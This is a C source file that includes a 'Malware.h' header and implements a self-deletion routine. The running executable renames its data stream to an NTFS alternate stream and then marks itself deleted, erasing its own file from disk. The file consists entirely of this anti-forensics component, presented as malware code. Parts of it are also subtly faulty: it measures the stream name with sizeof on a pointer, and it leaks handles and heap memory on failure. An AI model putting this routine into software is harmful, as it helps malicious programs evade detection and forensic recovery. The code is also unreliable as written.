#include "Malware.h"

int selfDelete() {

	// Defining handle for the malware file
	HANDLE hFile = INVALID_HANDLE_VALUE;

	// Defining the variable which holds the added stream
	const wchar_t* NEWSTREAM = (const wchar_t*)NEW_STREAM;

	// FILE_RENAME_INFO structure only holds one-byte variable for renaming
	// Therefore, we allocate extra memory for our ADS(Alternate Data Stream)
	size_t renameSize = sizeof(FILE_RENAME_INFO) + sizeof(NEWSTREAM);

	// For now, it points to NULL
	PFILE_RENAME_INFO PFRI = NULL;

	// Defining path size as MAX_PATH * 2 lenght because we use wide-char and we do not want to get any segmentation fault
	WCHAR filePath[MAX_PATH * 2] = { 0 }; 

	// For now, it is defined to 0
	FILE_DISPOSITION_INFO setDelete = { 0 };

	// Allocationg memory for our NULL pointer and checking if it is allocated
	PFRI = (PFILE_RENAME_INFO) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, renameSize);
	if (!PFRI) {
		printf("Sorry, heap cannot be allocated...\n");
		return EXIT_FAILURE;
	}

	// Setting delete file variable to TRUE to delete the file in future
	setDelete.DeleteFileA = TRUE;

	// Filling the variables in rename info to rename
	PFRI->FileNameLength = sizeof(NEWSTREAM);
	RtlCopyMemory(PFRI->FileName, NEWSTREAM, sizeof(NEWSTREAM));

	// Getting file full name and sending it to the filePath variable
	GetModuleFileNameW(NULL, filePath, MAX_PATH * 2);

	// Getting the file handle
	hFile = CreateFileW(filePath, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("Sorry, the file cannot be opened...\n");
		return EXIT_FAILURE;
	}

	// Changing the name of file
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, PFRI, renameSize)) {
		printf("Sorry, the file cannot be renamed...\n");
		return EXIT_FAILURE;
	}

	// Closing handle for changes to take effect 
	CloseHandle(hFile);

	// Getting the file handle again
	hFile = CreateFileW(filePath, (DELETE | SYNCHRONIZE), FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("Sorry, the file handle cannot be opened after renaming...\n");
		return EXIT_FAILURE;
	}

	// Deleting the file
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &setDelete, sizeof(setDelete))) {
		printf("Sorry, the file cannot be deleted...\n");
		return EXIT_FAILURE;
	}

	// Closing the file handle
	CloseHandle(hFile);

	// Freeing the allocated memory
	HeapFree(GetProcessHeap(), 0, PFRI);

	return EXIT_SUCCESS;
}